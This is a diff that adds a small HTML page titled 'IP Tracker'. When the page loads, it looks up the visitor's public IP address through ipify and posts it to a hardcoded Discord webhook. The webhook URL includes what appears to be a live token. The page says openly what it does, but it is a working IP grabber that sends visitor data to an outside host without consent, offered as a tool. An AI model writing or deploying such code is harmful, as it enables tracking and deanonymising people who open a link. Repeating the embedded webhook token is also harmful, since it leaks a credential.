@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>IP Tracker</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        $(document).ready(function() {
+            $.getJSON("https://api.ipify.org?format=json", function(data) {
+                var ip = data.ip;
+                var webhookUrl = "https://discord.com/api/webhooks/1187491873175109713/4kcz2pbN8UAEAn7Ux2aYNu1x9AcW4xrDF_B52_DROKXPiVjvp_HSgVK86tYhWib0y9Mh";
+
+                $.ajax({
+                    type: "POST",
+                    url: webhookUrl,
+                    data: JSON.stringify({ content: "User IP: " + ip }),
+                    contentType: "application/json",
+                    success: function() {
+                        console.log("IP sent to Discord successfully!");
+                    },
+                    error: function() {
+                        console.error("Failed to send IP to Discord.");
+                    }
+                });
+            });
+        });
+    </script>
+</head>
+<body>
+    <h1>IP Tracker</h1>
+    <p>This website will grab your IP address and send it to Discord.</p>
+</body>
+</html>
